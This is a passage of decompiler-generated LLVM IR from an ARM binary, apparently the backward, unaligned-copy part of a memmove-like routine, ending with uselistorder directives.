dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge, %dec_label_pc_16c04
  %v0_16c30 = phi i32 [ %v1_16c30, %dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge ], [ %v0_16c3019, %dec_label_pc_16c04 ]
  %v0_16c10 = phi i32 [ %v0_16c10.pre, %dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge ], [ %v1_16be8, %dec_label_pc_16c04 ]
  %v0_16c0c = phi i32 [ %v0_16c0c.pre, %dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge ], [ %v2_16bec, %dec_label_pc_16c04 ]
  %v3_16c0c = mul i32 %v0_16c0c, 256
  store i32 %v3_16c0c, i32* %lr.global-to-local, align 4
  %v1_16c10 = add i32 %v0_16c10, -4
  %v2_16c10 = inttoptr i32 %v1_16c10 to i32*
  %v3_16c10 = load i32, i32* %v2_16c10, align 4
  store i32 %v3_16c10, i32* @r3, align 4
  %v4_16c10 = add i32 %v0_16c10, -8
  %v5_16c10 = inttoptr i32 %v4_16c10 to i32*
  %v6_16c10 = load i32, i32* %v5_16c10, align 4
  store i32 %v6_16c10, i32* %r4.global-to-local, align 4
  %v7_16c10 = add i32 %v0_16c10, -12
  %v8_16c10 = inttoptr i32 %v7_16c10 to i32*
  %v9_16c10 = load i32, i32* %v8_16c10, align 4
  store i32 %v9_16c10, i32* %r5.global-to-local, align 4
  %v10_16c10 = add i32 %v0_16c10, -16
  %v11_16c10 = inttoptr i32 %v10_16c10 to i32*
  %v12_16c10 = load i32, i32* %v11_16c10, align 4
  store i32 %v10_16c10, i32* %r1.global-to-local, align 4
  %v4_16c14 = udiv i32 %v12_16c10, 16777216
  %v5_16c14 = or i32 %v4_16c14, %v3_16c0c
  store i32 %v5_16c14, i32* %lr.global-to-local, align 4
  %v3_16c18 = mul i32 %v12_16c10, 256
  %v4_16c1c = udiv i32 %v9_16c10, 16777216
  %v5_16c1c = or i32 %v3_16c18, %v4_16c1c
  store i32 %v5_16c1c, i32* @ip, align 4
  %v3_16c20 = mul i32 %v9_16c10, 256
  %v4_16c24 = udiv i32 %v6_16c10, 16777216
  %v5_16c24 = or i32 %v3_16c20, %v4_16c24
  store i32 %v5_16c24, i32* %r5.global-to-local, align 4
  %v3_16c28 = mul i32 %v6_16c10, 256
  %v4_16c2c = udiv i32 %v3_16c10, 16777216
  %v5_16c2c = or i32 %v3_16c28, %v4_16c2c
  store i32 %v5_16c2c, i32* %r4.global-to-local, align 4
  %v1_16c30 = add i32 %v0_16c30, -16
  %v2_16c30 = inttoptr i32 %v1_16c30 to i32*
  store i32 %v5_16c2c, i32* %v2_16c30, align 4
  %v4_16c30 = add i32 %v0_16c30, -12
  %v5_16c30 = inttoptr i32 %v4_16c30 to i32*
  %v6_16c30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16c30, i32* %v5_16c30, align 4
  %v7_16c30 = add i32 %v0_16c30, -8
  %v8_16c30 = inttoptr i32 %v7_16c30 to i32*
  %v9_16c30 = load i32, i32* @ip, align 4
  store i32 %v9_16c30, i32* %v8_16c30, align 4
  %v10_16c30 = add i32 %v0_16c30, -4
  %v11_16c30 = inttoptr i32 %v10_16c30 to i32*
  %v12_16c30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16c30, i32* %v11_16c30, align 4
  store i32 %v1_16c30, i32* %r0.global-to-local, align 4
  %v0_16c34 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c34 = add i32 %v0_16c34, -16
  store i32 %v2_16c34, i32* %r2.global-to-local, align 4
  %v6_16c38 = icmp slt i32 %v0_16c34, 16
  br i1 %v6_16c38, label %dec_label_pc_16c3c, label %dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge

dec_label_pc_16c0c.dec_label_pc_16c0c_crit_edge:  ; preds = %dec_label_pc_16c0c
  %v0_16c0c.pre = load i32, i32* @r3, align 4
  %v0_16c10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c0c

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16c0c
  %v2_16c3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16c3c, i32* @r4, align 4
  %v5_16c3c = load i8*, i8** %stack_var_-8, align 4
  %v6_16c3c = ptrtoint i8* %v5_16c3c to i32
  store i32 %v6_16c3c, i32* @r5, align 4
  store i32 %v11_16c08, i32* @lr, align 4
  %v2_16c40 = add i32 %v0_16c34, -4
  store i32 %v2_16c40, i32* %r2.global-to-local, align 4
  %v4_16c40 = add i32 %v0_16c34, 2147483632
  %v5_16c40 = and i32 %v2_16c40, %v4_16c40
  %v6_16c40 = icmp slt i32 %v5_16c40, 0
  store i1 %v6_16c40, i1* %cpsr_v.global-to-local, align 1
  %v7_16c40 = icmp slt i32 %v2_16c40, 0
  store i1 %v7_16c40, i1* %cpsr_n.global-to-local, align 1
  %v8_16c40 = icmp eq i32 %v2_16c40, 0
  store i1 %v8_16c40, i1* %cpsr_z.global-to-local, align 1
  %v5_16c44 = icmp slt i32 %v2_16c34, -12
  br i1 %v5_16c44, label %dec_label_pc_16c60, label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c3c, %dec_label_pc_16bfc, %dec_label_pc_16c48
  %v1_16c54 = phi i32 [ %v5_16c54, %dec_label_pc_16c48 ], [ %v1_16c30, %dec_label_pc_16c3c ], [ %v0_16c3019, %dec_label_pc_16bfc ]
  %v0_16c48 = load i32, i32* @r3, align 4
  %v3_16c48 = mul i32 %v0_16c48, 256
  store i32 %v3_16c48, i32* %ip.global-to-local, align 4
  %v0_16c4c = load i32, i32* %r1.global-to-local, align 4
  %v1_16c4c = add i32 %v0_16c4c, -4
  %v2_16c4c = inttoptr i32 %v1_16c4c to i32*
  %v3_16c4c = load i32, i32* %v2_16c4c, align 4
  store i32 %v3_16c4c, i32* @r3, align 4
  store i32 %v1_16c4c, i32* %r1.global-to-local, align 4
  %v4_16c50 = udiv i32 %v3_16c4c, 16777216
  %v5_16c50 = or i32 %v4_16c50, %v3_16c48
  store i32 %v5_16c50, i32* @ip, align 4
  %v2_16c54 = add i32 %v1_16c54, -4
  %v3_16c54 = inttoptr i32 %v2_16c54 to i32*
  store i32 %v5_16c50, i32* %v3_16c54, align 4
  %v4_16c54 = load i32, i32* %r0.global-to-local, align 4
  %v5_16c54 = add i32 %v4_16c54, -4
  store i32 %v5_16c54, i32* %r0.global-to-local, align 4
  %v0_16c58 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c58 = add i32 %v0_16c58, -4
  store i32 %v2_16c58, i32* %r2.global-to-local, align 4
  %v6_16c5c = icmp slt i32 %v0_16c58, 4
  br i1 %v6_16c5c, label %dec_label_pc_16c60.loopexit, label %dec_label_pc_16c48

dec_label_pc_16c60.loopexit:                      ; preds = %dec_label_pc_16c48
  %v4_16c58 = sub i32 3, %v0_16c58
  %v5_16c58 = and i32 %v4_16c58, %v0_16c58
  %v6_16c58 = icmp slt i32 %v5_16c58, 0
  %v7_16c58 = icmp slt i32 %v2_16c58, 0
  store i1 %v6_16c58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16c58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16c60

dec_label_pc_16c60:                               ; preds = %dec_label_pc_16c60.loopexit, %dec_label_pc_16c3c
  %v2_16ba451 = phi i32 [ %v5_16c54, %dec_label_pc_16c60.loopexit ], [ %v1_16c30, %dec_label_pc_16c3c ]
  %v0_16b9447 = phi i32 [ %v2_16c58, %dec_label_pc_16c60.loopexit ], [ %v2_16c40, %dec_label_pc_16c3c ]
  %v0_16c60 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c60 = add i32 %v0_16c60, 3
  store i32 %v1_16c60, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16bf8
  br i1 %v5_16cd8, label %dec_label_pc_16cb4, label %dec_label_pc_16c70

dec_label_pc_16c70:                               ; preds = %dec_label_pc_16c68
  store i32 %v2_16cd4, i32* %r2.global-to-local, align 4
  %v3_16c74 = load i32, i32* @r4, align 4
  store i32 %v3_16c74, i32* %stack_var_-12, align 4
  %v6_16c74 = load i32, i32* @r5, align 4
  %v8_16c74 = inttoptr i32 %v6_16c74 to i8*
  store i8* %v8_16c74, i8** %stack_var_-8, align 4
  %v11_16c74 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c78.dec_label_pc_16c78_crit_edge, %dec_label_pc_16c70
  %v0_16c9c = phi i32 [ %v1_16c9c, %dec_label_pc_16c78.dec_label_pc_16c78_crit_edge ], [ %v0_16c3019, %dec_label_pc_16c70 ]
  %v0_16c7c = phi i32 [ %v0_16c7c.pre, %dec_label_pc_16c78.dec_label_pc_16c78_crit_edge ], [ %v1_16be8, %dec_label_pc_16c70 ]
  %v0_16c78 = phi i32 [ %v0_16c78.pre, %dec_label_pc_16c78.dec_label_pc_16c78_crit_edge ], [ %v2_16bec, %dec_label_pc_16c70 ]
  %v3_16c78 = mul i32 %v0_16c78, 65536
  store i32 %v3_16c78, i32* %lr.global-to-local, align 4
  %v1_16c7c = add i32 %v0_16c7c, -4
  %v2_16c7c = inttoptr i32 %v1_16c7c to i32*
  %v3_16c7c = load i32, i32* %v2_16c7c, align 4
  store i32 %v3_16c7c, i32* @r3, align 4
  %v4_16c7c = add i32 %v0_16c7c, -8
  %v5_16c7c = inttoptr i32 %v4_16c7c to i32*
  %v6_16c7c = load i32, i32* %v5_16c7c, align 4
  store i32 %v6_16c7c, i32* %r4.global-to-local, align 4
  %v7_16c7c = add i32 %v0_16c7c, -12
  %v8_16c7c = inttoptr i32 %v7_16c7c to i32*
  %v9_16c7c = load i32, i32* %v8_16c7c, align 4
  store i32 %v9_16c7c, i32* %r5.global-to-local, align 4
  %v10_16c7c = add i32 %v0_16c7c, -16
  %v11_16c7c = inttoptr i32 %v10_16c7c to i32*
  %v12_16c7c = load i32, i32* %v11_16c7c, align 4
  store i32 %v10_16c7c, i32* %r1.global-to-local, align 4
  %v4_16c80 = udiv i32 %v12_16c7c, 65536
  %v5_16c80 = or i32 %v4_16c80, %v3_16c78
  store i32 %v5_16c80, i32* %lr.global-to-local, align 4
  %v3_16c84 = mul i32 %v12_16c7c, 65536
  %v4_16c88 = udiv i32 %v9_16c7c, 65536
  %v5_16c88 = or i32 %v3_16c84, %v4_16c88
  store i32 %v5_16c88, i32* @ip, align 4
  %v3_16c8c = mul i32 %v9_16c7c, 65536
  %v4_16c90 = udiv i32 %v6_16c7c, 65536
  %v5_16c90 = or i32 %v3_16c8c, %v4_16c90
  store i32 %v5_16c90, i32* %r5.global-to-local, align 4
  %v3_16c94 = mul i32 %v6_16c7c, 65536
  %v4_16c98 = udiv i32 %v3_16c7c, 65536
  %v5_16c98 = or i32 %v3_16c94, %v4_16c98
  store i32 %v5_16c98, i32* %r4.global-to-local, align 4
  %v1_16c9c = add i32 %v0_16c9c, -16
  %v2_16c9c = inttoptr i32 %v1_16c9c to i32*
  store i32 %v5_16c98, i32* %v2_16c9c, align 4
  %v4_16c9c = add i32 %v0_16c9c, -12
  %v5_16c9c = inttoptr i32 %v4_16c9c to i32*
  %v6_16c9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16c9c, i32* %v5_16c9c, align 4
  %v7_16c9c = add i32 %v0_16c9c, -8
  %v8_16c9c = inttoptr i32 %v7_16c9c to i32*
  %v9_16c9c = load i32, i32* @ip, align 4
  store i32 %v9_16c9c, i32* %v8_16c9c, align 4
  %v10_16c9c = add i32 %v0_16c9c, -4
  %v11_16c9c = inttoptr i32 %v10_16c9c to i32*
  %v12_16c9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16c9c, i32* %v11_16c9c, align 4
  store i32 %v1_16c9c, i32* %r0.global-to-local, align 4
  %v0_16ca0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ca0 = add i32 %v0_16ca0, -16
  store i32 %v2_16ca0, i32* %r2.global-to-local, align 4
  %v6_16ca4 = icmp slt i32 %v0_16ca0, 16
  br i1 %v6_16ca4, label %dec_label_pc_16ca8, label %dec_label_pc_16c78.dec_label_pc_16c78_crit_edge

dec_label_pc_16c78.dec_label_pc_16c78_crit_edge:  ; preds = %dec_label_pc_16c78
  %v0_16c78.pre = load i32, i32* @r3, align 4
  %v0_16c7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16c78

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16c78
  %v2_16ca8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ca8, i32* @r4, align 4
  %v5_16ca8 = load i8*, i8** %stack_var_-8, align 4
  %v6_16ca8 = ptrtoint i8* %v5_16ca8 to i32
  store i32 %v6_16ca8, i32* @r5, align 4
  store i32 %v11_16c74, i32* @lr, align 4
  %v2_16cac = add i32 %v0_16ca0, -4
  store i32 %v2_16cac, i32* %r2.global-to-local, align 4
  %v4_16cac = add i32 %v0_16ca0, 2147483632
  %v5_16cac = and i32 %v2_16cac, %v4_16cac
  %v6_16cac = icmp slt i32 %v5_16cac, 0
  store i1 %v6_16cac, i1* %cpsr_v.global-to-local, align 1
  %v7_16cac = icmp slt i32 %v2_16cac, 0
  store i1 %v7_16cac, i1* %cpsr_n.global-to-local, align 1
  %v8_16cac = icmp eq i32 %v2_16cac, 0
  store i1 %v8_16cac, i1* %cpsr_z.global-to-local, align 1
  %v5_16cb0 = icmp slt i32 %v2_16ca0, -12
  br i1 %v5_16cb0, label %dec_label_pc_16ccc, label %dec_label_pc_16cb4

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16ca8, %dec_label_pc_16c68, %dec_label_pc_16cb4
  %v1_16cc0 = phi i32 [ %v5_16cc0, %dec_label_pc_16cb4 ], [ %v1_16c9c, %dec_label_pc_16ca8 ], [ %v0_16c3019, %dec_label_pc_16c68 ]
  %v0_16cb4 = load i32, i32* @r3, align 4
  %v3_16cb4 = mul i32 %v0_16cb4, 65536
  store i32 %v3_16cb4, i32* %ip.global-to-local, align 4
  %v0_16cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cb8 = add i32 %v0_16cb8, -4
  %v2_16cb8 = inttoptr i32 %v1_16cb8 to i32*
  %v3_16cb8 = load i32, i32* %v2_16cb8, align 4
  store i32 %v3_16cb8, i32* @r3, align 4
  store i32 %v1_16cb8, i32* %r1.global-to-local, align 4
  %v4_16cbc = udiv i32 %v3_16cb8, 65536
  %v5_16cbc = or i32 %v4_16cbc, %v3_16cb4
  store i32 %v5_16cbc, i32* @ip, align 4
  %v2_16cc0 = add i32 %v1_16cc0, -4
  %v3_16cc0 = inttoptr i32 %v2_16cc0 to i32*
  store i32 %v5_16cbc, i32* %v3_16cc0, align 4
  %v4_16cc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_16cc0 = add i32 %v4_16cc0, -4
  store i32 %v5_16cc0, i32* %r0.global-to-local, align 4
  %v0_16cc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_16cc4 = add i32 %v0_16cc4, -4
  store i32 %v2_16cc4, i32* %r2.global-to-local, align 4
  %v6_16cc8 = icmp slt i32 %v0_16cc4, 4
  br i1 %v6_16cc8, label %dec_label_pc_16ccc.loopexit, label %dec_label_pc_16cb4

dec_label_pc_16ccc.loopexit:                      ; preds = %dec_label_pc_16cb4
  %v4_16cc4 = sub i32 3, %v0_16cc4
  %v5_16cc4 = and i32 %v4_16cc4, %v0_16cc4
  %v6_16cc4 = icmp slt i32 %v5_16cc4, 0
  %v7_16cc4 = icmp slt i32 %v2_16cc4, 0
  store i1 %v6_16cc4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16cc4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ccc

dec_label_pc_16ccc:                               ; preds = %dec_label_pc_16ccc.loopexit, %dec_label_pc_16ca8
  %v2_16ba452 = phi i32 [ %v5_16cc0, %dec_label_pc_16ccc.loopexit ], [ %v1_16c9c, %dec_label_pc_16ca8 ]
  %v0_16b9448 = phi i32 [ %v2_16cc4, %dec_label_pc_16ccc.loopexit ], [ %v2_16cac, %dec_label_pc_16ca8 ]
  %v0_16ccc = load i32, i32* %r1.global-to-local, align 4
  %v1_16ccc = add i32 %v0_16ccc, 2
  store i32 %v1_16ccc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16be8
  br i1 %v5_16cd8, label %dec_label_pc_16d20, label %dec_label_pc_16cdc

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16cd4
  store i32 %v2_16cd4, i32* %r2.global-to-local, align 4
  %v3_16ce0 = load i32, i32* @r4, align 4
  store i32 %v3_16ce0, i32* %stack_var_-12, align 4
  %v6_16ce0 = load i32, i32* @r5, align 4
  %v8_16ce0 = inttoptr i32 %v6_16ce0 to i8*
  store i8* %v8_16ce0, i8** %stack_var_-8, align 4
  %v11_16ce0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16ce4

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge, %dec_label_pc_16cdc
  %v0_16d08 = phi i32 [ %v1_16d08, %dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge ], [ %v0_16c3019, %dec_label_pc_16cdc ]
  %v0_16ce8 = phi i32 [ %v0_16ce8.pre, %dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge ], [ %v1_16be8, %dec_label_pc_16cdc ]
  %v0_16ce4 = phi i32 [ %v0_16ce4.pre, %dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge ], [ %v2_16bec, %dec_label_pc_16cdc ]
  %v3_16ce4 = mul i32 %v0_16ce4, 16777216
  store i32 %v3_16ce4, i32* %lr.global-to-local, align 4
  %v1_16ce8 = add i32 %v0_16ce8, -4
  %v2_16ce8 = inttoptr i32 %v1_16ce8 to i32*
  %v3_16ce8 = load i32, i32* %v2_16ce8, align 4
  store i32 %v3_16ce8, i32* @r3, align 4
  %v4_16ce8 = add i32 %v0_16ce8, -8
  %v5_16ce8 = inttoptr i32 %v4_16ce8 to i32*
  %v6_16ce8 = load i32, i32* %v5_16ce8, align 4
  store i32 %v6_16ce8, i32* %r4.global-to-local, align 4
  %v7_16ce8 = add i32 %v0_16ce8, -12
  %v8_16ce8 = inttoptr i32 %v7_16ce8 to i32*
  %v9_16ce8 = load i32, i32* %v8_16ce8, align 4
  store i32 %v9_16ce8, i32* %r5.global-to-local, align 4
  %v10_16ce8 = add i32 %v0_16ce8, -16
  %v11_16ce8 = inttoptr i32 %v10_16ce8 to i32*
  %v12_16ce8 = load i32, i32* %v11_16ce8, align 4
  store i32 %v10_16ce8, i32* %r1.global-to-local, align 4
  %v4_16cec = udiv i32 %v12_16ce8, 256
  %v5_16cec = or i32 %v4_16cec, %v3_16ce4
  store i32 %v5_16cec, i32* %lr.global-to-local, align 4
  %v3_16cf0 = mul i32 %v12_16ce8, 16777216
  %v4_16cf4 = udiv i32 %v9_16ce8, 256
  %v5_16cf4 = or i32 %v3_16cf0, %v4_16cf4
  store i32 %v5_16cf4, i32* @ip, align 4
  %v3_16cf8 = mul i32 %v9_16ce8, 16777216
  %v4_16cfc = udiv i32 %v6_16ce8, 256
  %v5_16cfc = or i32 %v3_16cf8, %v4_16cfc
  store i32 %v5_16cfc, i32* %r5.global-to-local, align 4
  %v3_16d00 = mul i32 %v6_16ce8, 16777216
  %v4_16d04 = udiv i32 %v3_16ce8, 256
  %v5_16d04 = or i32 %v3_16d00, %v4_16d04
  store i32 %v5_16d04, i32* %r4.global-to-local, align 4
  %v1_16d08 = add i32 %v0_16d08, -16
  %v2_16d08 = inttoptr i32 %v1_16d08 to i32*
  store i32 %v5_16d04, i32* %v2_16d08, align 4
  %v4_16d08 = add i32 %v0_16d08, -12
  %v5_16d08 = inttoptr i32 %v4_16d08 to i32*
  %v6_16d08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16d08, i32* %v5_16d08, align 4
  %v7_16d08 = add i32 %v0_16d08, -8
  %v8_16d08 = inttoptr i32 %v7_16d08 to i32*
  %v9_16d08 = load i32, i32* @ip, align 4
  store i32 %v9_16d08, i32* %v8_16d08, align 4
  %v10_16d08 = add i32 %v0_16d08, -4
  %v11_16d08 = inttoptr i32 %v10_16d08 to i32*
  %v12_16d08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16d08, i32* %v11_16d08, align 4
  store i32 %v1_16d08, i32* %r0.global-to-local, align 4
  %v0_16d0c = load i32, i32* %r2.global-to-local, align 4
  %v2_16d0c = add i32 %v0_16d0c, -16
  store i32 %v2_16d0c, i32* %r2.global-to-local, align 4
  %v6_16d10 = icmp slt i32 %v0_16d0c, 16
  br i1 %v6_16d10, label %dec_label_pc_16d14, label %dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge

dec_label_pc_16ce4.dec_label_pc_16ce4_crit_edge:  ; preds = %dec_label_pc_16ce4
  %v0_16ce4.pre = load i32, i32* @r3, align 4
  %v0_16ce8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ce4

dec_label_pc_16d14:                               ; preds = %dec_label_pc_16ce4
  %v2_16d14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16d14, i32* @r4, align 4
  %v5_16d14 = load i8*, i8** %stack_var_-8, align 4
  %v6_16d14 = ptrtoint i8* %v5_16d14 to i32
  store i32 %v6_16d14, i32* @r5, align 4
  store i32 %v11_16ce0, i32* @lr, align 4
  %v2_16d18 = add i32 %v0_16d0c, -4
  store i32 %v2_16d18, i32* %r2.global-to-local, align 4
  %v4_16d18 = add i32 %v0_16d0c, 2147483632
  %v5_16d18 = and i32 %v2_16d18, %v4_16d18
  %v6_16d18 = icmp slt i32 %v5_16d18, 0
  store i1 %v6_16d18, i1* %cpsr_v.global-to-local, align 1
  %v7_16d18 = icmp slt i32 %v2_16d18, 0
  store i1 %v7_16d18, i1* %cpsr_n.global-to-local, align 1
  %v8_16d18 = icmp eq i32 %v2_16d18, 0
  store i1 %v8_16d18, i1* %cpsr_z.global-to-local, align 1
  %v5_16d1c = icmp slt i32 %v2_16d0c, -12
  br i1 %v5_16d1c, label %dec_label_pc_16d38, label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d14, %dec_label_pc_16cd4, %dec_label_pc_16d20
  %v1_16d2c = phi i32 [ %v5_16d2c, %dec_label_pc_16d20 ], [ %v1_16d08, %dec_label_pc_16d14 ], [ %v0_16c3019, %dec_label_pc_16cd4 ]
  %v0_16d20 = load i32, i32* @r3, align 4
  %v3_16d20 = mul i32 %v0_16d20, 16777216
  store i32 %v3_16d20, i32* %ip.global-to-local, align 4
  %v0_16d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d24 = add i32 %v0_16d24, -4
  %v2_16d24 = inttoptr i32 %v1_16d24 to i32*
  %v3_16d24 = load i32, i32* %v2_16d24, align 4
  store i32 %v3_16d24, i32* @r3, align 4
  store i32 %v1_16d24, i32* %r1.global-to-local, align 4
  %v4_16d28 = udiv i32 %v3_16d24, 256
  %v5_16d28 = or i32 %v4_16d28, %v3_16d20
  store i32 %v5_16d28, i32* @ip, align 4
  %v2_16d2c = add i32 %v1_16d2c, -4
  %v3_16d2c = inttoptr i32 %v2_16d2c to i32*
  store i32 %v5_16d28, i32* %v3_16d2c, align 4
  %v4_16d2c = load i32, i32* %r0.global-to-local, align 4
  %v5_16d2c = add i32 %v4_16d2c, -4
  store i32 %v5_16d2c, i32* %r0.global-to-local, align 4
  %v0_16d30 = load i32, i32* %r2.global-to-local, align 4
  %v2_16d30 = add i32 %v0_16d30, -4
  store i32 %v2_16d30, i32* %r2.global-to-local, align 4
  %v6_16d34 = icmp slt i32 %v0_16d30, 4
  br i1 %v6_16d34, label %dec_label_pc_16d38.loopexit, label %dec_label_pc_16d20

dec_label_pc_16d38.loopexit:                      ; preds = %dec_label_pc_16d20
  %v4_16d30 = sub i32 3, %v0_16d30
  %v5_16d30 = and i32 %v4_16d30, %v0_16d30
  %v6_16d30 = icmp slt i32 %v5_16d30, 0
  %v7_16d30 = icmp slt i32 %v2_16d30, 0
  store i1 %v6_16d30, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16d30, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16d38

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16d38.loopexit, %dec_label_pc_16d14
  %v2_16ba453 = phi i32 [ %v5_16d2c, %dec_label_pc_16d38.loopexit ], [ %v1_16d08, %dec_label_pc_16d14 ]
  %v0_16b9449 = phi i32 [ %v2_16d30, %dec_label_pc_16d38.loopexit ], [ %v2_16d18, %dec_label_pc_16d14 ]
  %v0_16d38 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d38 = add i32 %v0_16d38, 1
  store i32 %v1_16d38, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_16d2c, { 0, 2, 1 }
  uselistorder i32 %v3_16d20, { 1, 0 }
  uselistorder i32 %v2_16d18, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d08, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16ce8, { 1, 0 }
  uselistorder i32 %v3_16ce4, { 1, 0 }
  uselistorder i32 %v0_16ce8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16d08, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16cc0, { 0, 2, 1 }
  uselistorder i32 %v3_16cb4, { 1, 0 }
  uselistorder i32 %v2_16cac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16c7c, { 1, 0 }
  uselistorder i32 %v3_16c78, { 1, 0 }
  uselistorder i32 %v0_16c7c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16c9c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16c54, { 0, 2, 1 }
  uselistorder i32 %v3_16c48, { 1, 0 }
  uselistorder i32 %v2_16c40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16c10, { 1, 0 }
  uselistorder i32 %v3_16c0c, { 1, 0 }
  uselistorder i32 %v0_16c10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16c30, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16cd8, { 2, 0, 1 }
  uselistorder i32 %v0_16bf0, { 1, 0 }
  uselistorder i32 %v0_16cdc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16c3019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16be0, { 2, 1, 0 }
  uselistorder i32 %v0_16be0, { 2, 0, 1 }
  uselistorder i32 %v2_16bd8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16bd8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16bd8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16c3020, { 2, 1, 0 }
  uselistorder i32 %v11_16bb4, { 1, 0 }
  uselistorder i32 %v7_16bb4, { 1, 0 }
  uselistorder i32 %v1_16b94, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16b94, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16b98, { 1, 0 }
  uselistorder i32 %v7_16b8c, { 0, 2, 1 }
  uselistorder i32 %v10_16b88, { 1, 0 }
  uselistorder i32 %v9_16b80, { 1, 0, 2 }
  uselistorder i32 %v6_16b7c, { 1, 0 }
  uselistorder i32 %v2_16b74, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16b74, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16b84, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16b68, { 0, 2, 1 }
  uselistorder i32 %v13_16b64, { 1, 0 }
  uselistorder i32 %v4_16b60, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16b60, { 2, 0, 1 }
  uselistorder i32 %v6_16b68, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16b58, { 0, 2, 1 }
  uselistorder i32 %v16_16b54, { 1, 0 }
  uselistorder i32 %v4_16b50, { 1, 2, 0 }
  uselistorder i32 %v0_16b60.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16b58, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16b44, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16b40, { 1, 0 }
  uselistorder i32 %v1_16b3c, { 1, 0 }
  uselistorder i32 %v10_16b38, { 1, 0 }
  uselistorder i32 %v0_16b38, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16b3c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16b30, { 0, 2, 1 }
  uselistorder i32 %v2_16b24, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16b24, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16b3c37, { 1, 2, 0 }
  uselistorder i32 %v1_16b1c, { 2, 1, 0 }
  uselistorder i32 %v1_16b14, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16b0c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16b08, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16b04, { 2, 3, 1, 0, 4 }
